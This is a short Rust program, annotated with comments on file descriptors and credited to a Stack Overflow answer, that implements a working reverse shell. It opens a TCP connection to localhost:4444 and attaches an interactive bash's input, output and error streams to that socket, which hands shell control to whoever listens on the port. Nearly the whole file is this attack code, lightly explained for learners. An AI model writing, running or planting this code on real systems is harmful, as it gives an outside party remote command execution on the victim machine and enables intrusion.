use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

fn main() {
    let sock = TcpStream::connect("localhost:4444").unwrap();

    // a tcp socket as a raw file descriptor
    // a file descriptor is the number that uniquely identifies an open file in a computer's operating system
    // When a program asks to open a file/other resource (network socket, etc.) the kernel:
    //     1. Grants access
    //     2. Creates an entry in the global file table
    //     3. Provides the software with the location of that entry (file descriptor)
    // https://www.computerhope.com/jargon/f/file-descriptor.htm
    let fd = sock.as_raw_fd();
    // so basically, writing to a tcp socket is just like writing something to a file!
    // the main difference being that there is a client over the network reading the file at the same time!

    Command::new("/bin/bash")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}

// Original Code without annotations can be found here:
//https://stackoverflow.com/questions/48958814/what-is-the-rust-equivalent-of-a-reverse-shell-script-written-in-python?answertab=active#tab-top
